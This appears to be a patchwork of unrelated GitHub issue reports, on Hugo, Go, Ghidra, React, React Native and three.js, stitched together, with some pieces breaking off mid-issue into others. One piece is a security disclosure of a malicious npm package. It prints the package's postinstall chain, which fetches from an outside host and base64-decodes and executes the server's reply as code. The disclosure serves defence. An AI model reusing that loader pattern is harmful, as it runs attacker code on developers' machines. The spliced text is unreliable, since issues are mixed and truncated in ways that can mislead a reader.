issue_description:
It would be useful to be able to build JavaScript from page bundle resources via `js.Build`.

Currently, I can use `js.Build` on a single file in page bundles, but it doesn't work for files that import other files in the page bundle.

This proposal differs from https://github.com/gohugoio/hugo/issues/7944. This proposal suggests resolving imports from page bundles the same way that we can resolve imports from the assets directory. That earlier proposal suggests passing the page as context and using special `@page` tokens to reference imports, which is unique to Hugo and will break in IDEs and linters that don't understand the convention.

Thanks for your consideration.

## Failing example I'm proposing to make work

For instance, in this content file:

```markdown
+++
# content/blog/example/index.md
title = "Example post"
+++
<script type="module">
  import { test1 } from '{{< jsbPage "test1.ts" >}}';
  test1();
</script>
```

Referencing these TypeScript files as page bundle resources:

```typescript
// content/blog/example/test1.js
import { test2val } from "./test2.ts";
export function test1() {
  console.log("test1.ts importing from test2:" + test2val);
}
```

```typescript
// content/blog/example/test2.ts
export const test2val = "This is the test2 value";
```

With this shortcode:

```go-html-template
{{/* layouts/shortcodes/jsbPage */}}
{{- $ts := .Page.Resources.Get (.Get 0) | js.Build (dict "format" "esm" "sourceMap" "inline") | fingerprint -}}
{{- $ts.RelPermalink -}}
```

I get an error:

```text
ERROR Rebuild failed: JSBUILD: failed to transform "/blog/example/test1.ts" (text/typescript): Could not resolve "./test2.ts"
```

If `test1.ts` doesn't do any importing, it works fine.

## Current workaround by using site assets instead of page assets

By contrast, if I instead place the TypeScript files under `/assets`, and use a shortcode to get them from there:

```markdown
+++
# content/blog/example/index.md
title = "Example post"
+++
<script type="module">
  import { test1 } from '{{< jsbSite "example/test1.ts" >}}';
  test1();
</script>
```

Referencing these TypeScript files as page resources:

```typescript
// assets/example/test1.js
import { test2val } from "./test2.ts";
export function test1() {
  console.log("test1.ts importing from test2:" + test2val);
}
```

```typescript
// assets/example/test2.ts
export const test2val = "This is the test2 value";
```

With this shortcode:

```go-html-template
{{/* layouts/shortcodes/jsbSite */}}
{{- $ts := resources.Get (.Get 0) | js.Build (dict "format" "esm" "sourceMap" "inline") | fingerprint -}}
{{- $ts.RelPermalink -}}
```

This works fine. The downside is that the code is not located together.

E.g.

```
{{ sort site.Params.grades "value1" "asc" "value2" "desc" }} 
```

But we also need a way to handle zero values, as demonstrated by Hugo's default page sort:

This would not work:

```
{{ sort site.Params.grades "weight" "asc" "lastMod" "desc" }} 
```


Maybe something ala:

```
{{ sort site.Params.grades 
  dict ( "key" "weight" "order" "asc" "zeroIsNotAValue" true }}
 }} 
```

Where `zeroIsNotAValue` need to be replaced with a better term, but it would effectively work as in the `less` func below:




```go
DefaultPageSort = func(p1, p2 Page) bool {
		o1, o2 := getOrdinals(p1, p2)
		if o1 != o2 && o1 != -1 && o2 != -1 {
			return o1 < o2
		}
		if p1.Weight() == p2.Weight() {
			if p1.Date().Unix() == p2.Date().Unix() {
				c := collatorStringCompare(func(p Page) string { return p.LinkTitle() }, p1, p2)
				if c == 0 {
					if p1.File().IsZero() || p2.File().IsZero() {
						return p1.File().IsZero()
					}
					return compare.LessStrings(p1.File().Filename(), p2.File().Filename())
				}
				return c < 0
			}
			return p1.Date().Unix() > p2.Date().Unix()
		}

		if p2.Weight() == 0 {
			return true
		}

		if p1.Weight() == 0 {
			return false
		}

		return p1.Weight() < p2.Weight()
	}
```

### Proposal Details

in short i just want to address https://github.com/woodpecker-ci/woodpecker/issues/6717 properly

=> reliably be able to kill ALL sub-processes spawn by exec.Command()

## Problem

this is currently not possible as Windows has no process groups. The Windows-native equivalent is a
[Job Object](https://learn.microsoft.com/en-us/windows/win32/procthread/job-objects).

as in the pase a generic arg passthrough (#44005) was declined ... and typed fields per use case accepted (#44011)

## so i propose:

Add one new field to `syscall.SysProcAttr` on Windows:

```go
type SysProcAttr struct {
    // existing fields unchanged
    HideWindow                 bool
    CmdLine                    string
    CreationFlags              uint32
    Token                      Token
    ProcessAttributes          *SecurityAttributes
    ThreadAttributes           *SecurityAttributes
    NoInheritHandles           bool
    AdditionalInheritedHandles []Handle
    ParentProcess              Handle

    // NEW

    // JobObjects is a list of job object handles to assign to the new
    // process at creation time using PROC_THREAD_ATTRIBUTE_JOB_LIST.
    //
    // If non-empty, the new process is associated with these jobs before
    // its initial thread starts running.
    //
    // The caller is responsible for creating and configuring the jobs.
    // For example, callers that want child processes to be terminated when
    // the job is closed should configure JOB_OBJECT_LIMIT_KILL_ON_JOB_CLOSE.
    JobObjects []Handle
}
```

When `JobObject != 0`, `StartProcess` passes it via
`PROC_THREAD_ATTRIBUTE_JOB_LIST` in the `STARTUPINFOEX` attribute list.

With this any child process is a member of the job before any user code runs

NOTE: I am at no meas a windows expert and my finding is inspired by https://github.com/microsoft/hcsshim with the help of claude to surface that mechanism

位置: 第2章 第3节 时间复杂度

1.   常数阶  O(1)
[¶](https://www.hello-algo.com/chapter_computational_complexity/time_complexity/#1-o1)
常数阶的操作数量与输入数据大小 
 无关，即不随着 
 的变化而变化。

在以下函数中，尽管操作数量 size 可能很大，但由于其与输入数据大小 
 无关，因此时间复杂度仍为 ：
`
/* 常数阶 */
int constant(int n) {
    int count = 0;
    int size = 100000;
    int i = 0;
    for (int i = 0; i < size; i++) {
        count++;
    }
    return count;
}
`

描述:
这里 for 循环里的 int i = 0 定义了一个新的局部变量 i，它的作用域只在 for 循环内部。
也就是说：

外面的 int i = 0; 并没有被用到，它完全可以省略。
循环结束后，内部的 i 就消失了，外面的 i 仍然存在，但在你的函数里没有用到。

所以 外面的 int i = 0; 可以删掉

## Description

The React/JSX Style Guide (`react/README.md`) contains **3 broken external links** and **1 syntax error** in a code example.

### Broken Links (all return HTTP 404)

All three `facebook.github.io/react` URLs are dead — React's docs moved to `react.dev` and the legacy blog content is now at `legacy.reactjs.org`.

| Line | Broken URL | Status |
|------|-----------|--------|
| 28 | `https://facebook.github.io/react/docs/reusable-components.html#stateless-functions` | ❌ 404 |
| 78 | `https://facebook.github.io/react/blog/2016/07/13/mixins-considered-harmful.html` | ❌ 404 |
| 738 | `https://facebook.github.io/react/blog/2015/12/16/ismounted-antipattern.html` | ❌ 404 |

**Working replacements (verified):**
- `legacy.reactjs.org/docs/react-without-es6.html` ✅ 200
- `legacy.reactjs.org/blog/2016/07/13/mixins-considered-harmful.html` ✅ 200
- `legacy.reactjs.org/blog/2015/12/16/ismounted-antipattern.html` ✅ 200

### Syntax Error in Code Example (Line 457)

The "Spreading objects with known, explicit props" example has invalid JavaScript — `function Foo` is missing its parameter parentheses `()`:

```jsx
// Current (SyntaxError — won't parse)
export default function Foo {
  const props = { text: '', isPublished: false }
  return (<div {...props} />);
}


// Fixed
export default function Foo() {
  const props = { text: '', isPublished: false }
  return (<div {...props} />);
}

https://github.com/NationalSecurityAgency/ghidra/blob/b070495c0bdfe96b12469550a9bc76131f6c4dd7/Ghidra/Features/Base/src/main/java/ghidra/app/util/datatype/microsoft/GuidUtil.java#L286


Line 286, if variable **bytes[17]** Most Significant Bit(Bit 7) is a 1, then variable **versionData[0]** bits 31-16 will all be 1’s.

If this is not the wanted logic, then & 0xFFFF needs to be added.
                     ` versionData[0] = ((bytes[17] << 8) + bytes[16]) & 0xFFFF;
`

If determined a change is needed, line 288 has same issue.

Sample code:

		int versionData0;
		byte bytes17;
		byte bytes16;

		bytes17 = (byte) 0x80;
		bytes16 = 0x42;

		versionData0 = (bytes17 << 8) + bytes16;		
		System.out.println("versionData0 original is:       " + String.format("0x%08X", versionData0));

		versionData0 = ((bytes17 << 8) + (bytes16))  & 0xffff;		
		System.out.println("versionData0 with & 0xFFFF:     " + String.format("0x%08X", versionData0));


Outptut:

versionData0 original is:            0xFFFF8042
versionData0 with & 0xFFFF:     0x00008042

## Symptom

Changing `scene.environmentIntensity` after the initial render does not consistently update all objects using `MeshStandardNodeMaterial`.

With environment intensity and directional light intensity both set to zero, some objects become black while others retain their previous environment illumination.

Originally observed on imported GLB props, then reproduced with two spheres using stock `MeshStandardNodeMaterial`. No custom lighting model, textures, fog, emissive contribution, postprocessing, or material-specific environment maps are required.

Tested with three.js 0.184.0 and WebGPURenderer on macOS in a Chromium-based browser. Other releases have not been tested.

## Reproduction

Run the following as a browser module in a project resolving `three` to 0.184.0.

1. Let both spheres render.
2. Click **Set intensity to 0**.
3. One sphere becomes black while the other remains illuminated.
4. Click **Force a material refresh**.
5. Both spheres become black.

The constant scene environment node removes external HDR assets from the reproduction.

```js
import {
  DirectionalLight,
  Mesh,
  MeshStandardNodeMaterial,
  PerspectiveCamera,
  Scene,
  SphereGeometry,
  WebGPURenderer,
} from 'three/webgpu';
import { materialColor, vec3 } from 'three/tsl';

const scene = new Scene();
scene.environmentNode = vec3(1);
scene.environmentIntensity = 0.75;
scene.add(new DirectionalLight(0xffffff, 0));

const camera = new PerspectiveCamera(40, 2, 0.1, 20);
camera.position.z = 5;

const materials = [];

for (let i = 0; i < 2; i++) {
  const material = new MeshStandardNodeMaterial({
    color: 0xddd0af,
    metalness: 0,
    roughness: 0.8,
  });

  // Uncomment before the first render to apply the workaround:
  // material.colorNode = materialColor;

  materials.push(material);

  const mesh = new Mesh(
    new SphereGeometry(0.75, 32, 24),
    material,
  );
  mesh.position.x = (i - 0.5) * 2;
  scene.add(mesh);
}

function button(label, action) {
  const element = document.createElement('button');
  element.textContent = label;
  element.onclick = action;
  document.body.append(element);
}

button('Set intensity to 0', () => {
  scene.environmentIntensity = 0;
});

button('Force a material refresh', () => {
  // envMap is null. This changes an observed material property
  // without changing the effective environment intensity.
  for (const material of materials) {
    material.envMapIntensity = 0;
  }
});

const renderer = new WebGPURenderer({ antialias: true });
renderer.setSize(1000, 500);
renderer.setClearColor(0x151515);
document.body.append(renderer.domElement);

await renderer.init();
renderer.setAnimationLoop(() => renderer.render(scene, camera));
```

### Expected

Both spheres respond to the scene intensity change on the next render, without unrelated material mutations.

### Actual

One sphere retains its previous illumination until something else triggers its material/binding refresh.

## Root cause: refresh invalidation misses a scene dependency

The r184 source explains the observed behavior:

- Render objects with identical cache keys share a `NodeBuilderState`, including its observer.
- `NodeMaterialObserver.needsRefresh()` refreshes the first object encountered in a new render, but subsequent unchanged objects can skip refreshing.
- `materialEnvIntensity` updates through `onObjectUpdate()` and reads `scene.environmentIntensity` when `material.envMap` is null.
- The observer checks material properties such as `envMapIntensity`, but does not track the scene intensity.
- When refresh is skipped, the renderer skips node and binding updates, leaving the previous environment-intensity value in the object's GPU bindings.

Relevant r184 sources:

- [NodeMaterialObserver](https://github.com/mrdoob/three.js/blob/r184/src/materials/nodes/manager/NodeMaterialObserver.js)
- [Environment intensity uniform](https://github.com/mrdoob/three.js/blob/r184/src/nodes/accessors/MaterialProperties.js)
- [Shared NodeBuilderState](https://github.com/mrdoob/three.js/blob/r184/src/renderers/common/nodes/NodeBuilderState.js)
- [Renderer refresh path](https://github.com/mrdoob/three.js/blob/r184/src/renderers/common/Renderer.js)

## Verified workaround

For materials without an existing custom color node, assign this before the first render:

```js
material.colorNode = materialColor;
```

Both spheres then respond correctly.

This preserves the stock color calculation, but makes the observer's `hasNode` check return true, forcing the refresh path for each rendered object. It adds recurring CPU update/check work; it does not imply shader recompilation or unconditional GPU buffer uploads. Performance impact has not been measured.

## Proposed fix

Include scene-dependent environment values in refresh invalidation while preserving the optimization for unchanged objects.

One possible approach:

1. Track an environment-state revision per scene.
2. Advance it when relevant scene environment values change.
3. Track the last applied revision per affected render object/binding.
4. Refresh objects with an outdated revision, then resume normal skipping.

The invalidation must reach every affected object. A single shared dirty flag consumed by the first object would retain the same failure mode.

Preserve the existing precedence of `material.envMapIntensity` when a material has its own environment map.

Also audit `scene.environmentRotation`, which follows a similar object-updated uniform path. Rotation was not independently reproduced in this investigation.

## Suggested regression coverage

- Multiple stationary objects with separate materials sharing a shader configuration.
- Intensity transitions from nonzero to zero and back.
- Objects sharing the same material.
- Material-specific environment-map precedence.
- Objects becoming visible after an environment change.
- Shared materials used across scenes with different environment intensities.
- Confirm unchanged frames retain the intended refresh-skipping optimization.

Our malicious open source code scanning infrastructure behind [vet](https://github.com/safedep/vet) discovered an interesting npm package [eslint-config-airbnb-compat](https://www.npmjs.com/package/eslint-config-airbnb-compat) which appears to be malicious. This package appears to impersonate source origin as [github.com/airbnb/javascript](https://github.com/airbnb/javascript) possibly with the goal of starjacking and spoofing its origin to automated security tools. 

## Malicious Code

`eslint-config-airbnb-compat` contains a post install script to execute `setup.js`

```
"postinstall": "node ./setup",
```

However, to avoid identification, the `setup.js` does not have any malicious code. It simply does the following:

Copy the embedded `.env.example` to `.env`

```
if (!fs.existsSync(".env")) {
  fs.copyFileSync(".env.example", ".env");
  process.env.APP_PATH=process.cwd();
}
```

The `.env` file contains the following

```
APP_ENV=local
APP_PROXY=https://proxy.eslint-proxy.site
APP_LOCAL=
ESLINT_DEBUG=true
FORCE_COLOR=1
```

Execute `npm install` if `node_modules` directory is not present

```
if (!fs.existsSync("node_modules")) {
  run('npm install');
}
```

This may not appear as malicious but one of the transitive dependencies introduced by this package is `ts-runtime-compat-check`. This package in turn have a post install script:

```
"postinstall": "node lib/install.js",
```

The `lib/install.js` contains interesting code:

```
const appPath = process.env.APP_PATH || 'http://localhost';
    const proxy = process.env.APP_PROXY || 'http://localhost';

    const response = await fetch(
      `${proxy}/api/v1/hb89/data?appPath=${appPath}`
    );
```

When introduced through `eslint-config-airbnb-compat`, it will have `proxy=https://proxy.eslint-proxy.site` in the `fetch(..)` call above. The above fetch call is expected to fail to trigger `errorHandler` function with remote server provided error message

```
    if (!response.ok) {
      const apiError = await response.json();
      throw new Error(apiError.error);
    }
    await response.json();
  } catch (err) {
    errorHandler(err.message);
  }
```

So the remote server at `https://proxy.eslint-proxy.site` can return a JSON message such as `{"error": "<JS Payload>"}` which in turn will be passed to `errorHandler` as an `Error` object.

The error handler in turn does the following:

- Decode the message as base64 string

```
const decoded = Buffer.from(error, "base64").toString("utf-8");
```

- Constructs a function from the decoded string

```
const handler = new Function.constructor("require", errCode);
```

- Finally executes the remote code

```
  const handlerFunc = createHandler(decoded);
    if (handlerFunc) {
      handlerFunc(require);
    } else {
      console.error("Handler function is not available.");
    }
```

This pretty much confirm the malicious behaviour of the entire attack chain. We are in process of identifying the impact of this attack. Disclosing here because we feel its related to, if not targeting AirBnb packages and downstream users of these packages.

**Where:** `packages/react-native-renderer/src/legacy-events/ResponderEventPlugin.js`, `trackedTouchCount += 1` on any startish event and `-= 1` on any end or cancel event (lines 705 to 708 on main today). The same two lines are in v0.14.0 from 2015 and every version since, and the file has never consulted `changedTouches`: it assumes one touch per event. That assumption held under the legacy renderer, whose `receiveTouches` dispatches one JS event per changed touch. It no longer holds under Fabric: `RCTSurfaceTouchHandler._dispatchActiveTouches` dispatches one event per target view with every changed touch inside, so a coalesced lift or cancel of two touches on one view reaches this plugin as a single event. In that sense it is a New Architecture regression in the dispatch contract rather than in this file, but this file is where the count lives.

**What happens:** on iOS a multi-touch cancel arrives as one `topTouchCancel` whose `changedTouches` holds every cancelled touch. Two fingers that landed in separate events add 2, the single cancel subtracts 1, and the counter stays at 1 for the rest of the session. Nothing else moves it: single taps net zero, and the only warning fires on negative drift. `touchHistory.numberActiveTouches` stays correct, because it is re-synced from `touches.length` on every event, so the two disagree.

**Why it matters:** with the counter above zero the plugin runs a `selectionChangeShouldSetResponder` walk on every `topSelectionChange`. React Native's `TextInput` claims that walk unconditionally, so after one such gesture every keystroke hands the JS responder to the focused input with no finger down. The next touch anywhere outside that input starts its walk at the lowest common ancestor, never reaches the pressed element, and is dropped. The touch's own end releases the responder, so the following touch works. To a user: the first tap after typing does nothing, the second works.

**Reproduction (iOS, Fabric, RN 0.85.3), no gesture library needed:** a plain `View` large enough for two fingers, a `TextInput` elsewhere on the screen, and a `Pressable` outside the input. Put two fingers down on the View one after the other (two start events, same target), lift them together (one end event carrying both), focus the input, type one character, tap the Pressable once. The tap is dropped. Lift the fingers one at a time instead and it is not. A react-native-gesture-handler pinch reproduces it the same way, because activation cancels all touches in one event.

**Evidence:** a shadow of the counter kept at the app root with the same rule, logged per event, run on a plain View with no gesture handler: `A_START n=1`, `A_START n=2` twelve milliseconds later on the same target, then a single `A_END` with `changedTouches.length` 2, and the counter left at 1. On the app's canvas: Two `START`s on the canvas, then one `CANCEL` with zero remaining touches, counter 1, 2, 1. A second pinch, counter 2. Then at the keystroke a `selectionChange` walk with `numberActiveTouches` 0 and the counter at 2, the input granted the responder, and the next tap dropped.

**A second way it drifts:** one native touch event is dispatched as one JS event per target view, and each of those events carries the full `changedTouches` list. Two fingers landing together on two different views give two start events, so any rule that sums `changedTouches` per event counts each finger twice; lift them one at a time and the counter is left at 2. Observed on a plain `View` with no gesture handler.

**Fix:** after every touch event set the counter to `nativeEvent.touches.length`, the number of active touches, which is what `touchHistory.numberActiveTouches` already does. That is right under both cases above and needs no clamping. Verified in an app patch across the prod, dev and profiling bundles: the counter reads the active-touch count throughout, returns to zero after the gesture, and the selection-change walk no longer runs at keystrokes.

**Proposed change** (against `main`, `packages/react-native-renderer/src/legacy-events/ResponderEventPlugin.js`, around line 704). Set the counter to the number of active touches after every touch event, which is what `touchHistory.numberActiveTouches` already does, instead of adding and subtracting one per event:

```diff
   ) {
     if (isStartish(topLevelType)) {
-      trackedTouchCount += 1;
+      // One native touch event can carry several touches, and is dispatched
+      // once per target view with the full changedTouches list, so neither
+      // "one per event" nor "changedTouches.length per event" is right.
+      // nativeEvent.touches is the set of active touches after this event.
+      trackedTouchCount = nativeEvent.touches
+        ? nativeEvent.touches.length
+        : trackedTouchCount + 1;
     } else if (isEndish(topLevelType)) {
       if (trackedTouchCount >= 0) {
-        trackedTouchCount -= 1;
+        trackedTouchCount = nativeEvent.touches
+          ? nativeEvent.touches.length
+          : Math.max(0, trackedTouchCount - 1);
       } else {
```

The fallback keeps the old behaviour for any event that carries no `touches` array. We run this in production through patch-package against the compiled `ReactFabric-*.js` bundles of React Native 0.85.3.

**Describe the bug**
I am trying to work on the decompiler using `decomp_dbg` on my local clone. Running it using a relative path (`./decomp_dbg`) throws an exception caused by `FileManage::discoverGhidraRoot` ([`filemanage.cc`](https://github.com/NationalSecurityAgency/ghidra/blob/master/Ghidra/Features/Decompiler/src/decompile/cpp/filemanage.cc)) not checking if `cur` is an empty string before splitting (which afaik seems to happen in every case when `decomp_dbg` is run using a relative path?).

Anyways, even when using an absolute path, ghidra root is still not being found, because the tests `FileManage::testDevelopmentPath` and `FileManage::testInstallPath` are not returning true. I guess in this case I want the development check to be true which looks like the following:
```cpp
bool FileManage::testDevelopmentPath(const vector<string> &pathels,int level,string &root)
{ // Given pathels[level] is "Ghidra", determine if this is a Ghidra development layout
  if (level + 2 >= pathels.size()) return false;
  string parent = pathels[level + 1];
  if (parent.size() < 11) return false;
  string piecestr = parent.substr(0,7);
  if (piecestr != "ghidra.") return false;
  piecestr = parent.substr(parent.size() - 4);
  if (piecestr != ".git") return false;
  root = buildPath(pathels,level+2);
  vector<string> testpaths1;
  vector<string> testpaths2;
  scanDirectoryRecursive(testpaths1,"ghidra.git",root,1);
  if (testpaths1.size() != 1) return false;
  scanDirectoryRecursive(testpaths2,"Ghidra",testpaths1[0],1);
  return (testpaths2.size() == 1);
}
```
So having found the `Ghidra` directory it expects it to have a parent that starts with "ghidra." and ends with ".git" but also be more that 10 characters? And then the ghidra root is 2 directories higher than that and contains "ghidra.git"?

I am willing to fix those errors if someone can help me understand what those tests are intended to verify. Thanks

**To Reproduce**
Steps to reproduce the behavior:
1. Clone ghidra
2. Go to the cpp decompiler and build `decomp_dbg`
3. Run it
4. `decomp_dbg` exits with `Could not discover root of Ghidra installation`

**Expected behavior**
The decompiler console terminal interface starts

**Environment (please complete the following information):**
 - OS: Linux
 - Java Version: 17
 - Ghidra Version: master branch HEAD
 - Ghidra Origin: locally built

**React version:** 19.3.0 (also 19.3.0-canary-59aff3e1-20260918, 0.0.0-experimental-59aff3e1-20260918, and the canary vendored in Next.js 16.3.5)

**Summary**

`customizeViewTransitionError` in `packages/react-dom-bindings/src/client/ReactFiberConfigDOM.js` suppresses the `InvalidStateError` a browser raises when a view transition is skipped on a hidden document, but only by exact message equality. Since Chrome/Edge 153 (stable 2026-09-08) Blink appends the skip reason to the generic message, so the comparison fails and the error is passed to `onRecoverableError` on every skipped transition in a background tab. Firefox's wording was never in the list.

Messages observed in production:

- `Transition was aborted because of invalid state. Document hidden` (Chrome/Edge 153)
- `Transition was aborted because of invalid state. Viewport size changed` (Chrome/Edge 153)
- `Transition was aborted because of invalid state` (Chrome/Edge ≤ 152, suppressed today)
- `Skipped ViewTransition due to document being hidden` (Firefox 153–156, not suppressed)

Blink builds the string as prefix + skip reason (`FormatExceptionMessage` in `dom_view_transition.cc`), and on a hidden document only `ready` rejects, so the rejection goes through React's handler and the equality check is the only thing deciding suppress vs report. In one production app this went from zero to about 240 sessions/week starting 2026-09-09.

**Steps to reproduce**

Real browser: render a `<ViewTransition>` whose update is triggered by a timer, switch to another tab before it fires, come back. On Chrome 153 `onRecoverableError` receives the DOMException; on ≤ 152 nothing is reported.

Deterministic, browser-independent (this is how I verified 19.3.0):

```js
// before React loads: mimic Chromium's DidSkipTransition for a hidden document
const msg = "Transition was aborted because of invalid state. Document hidden";
document.startViewTransition = (opts) => {
  const update = typeof opts === "function" ? opts : opts.update;
  const updateDone = Promise.resolve().then(() => update());
  return { ready: Promise.reject(new DOMException(msg, "InvalidStateError")),
           finished: updateDone.then(() => undefined), updateCallbackDone: updateDone,
           skipTransition() {}, types: new Set() };
};
// then: createRoot(el, { onRecoverableError: console.error }) rendering a <ViewTransition>
// updated inside startTransition every second
```

Result with react-dom 19.3.0: the bare message logs nothing; the ". Document hidden" message and the Firefox message reach `onRecoverableError` on every transition.

**Current behavior**

Every skipped transition in a background tab surfaces as a recoverable error on Chrome/Edge 153+ and Firefox, which frameworks forward to `reportError` and error trackers record as a crash.

**Expected behavior**

The hidden-document skip stays suppressed as it was on Chrome ≤ 152. Suggested fix: match the Chrome prefix (`error.message.startsWith("Transition was aborted because of invalid state")`) and add Firefox's `"Skipped ViewTransition due to document being hidden"`. Happy to open a PR.

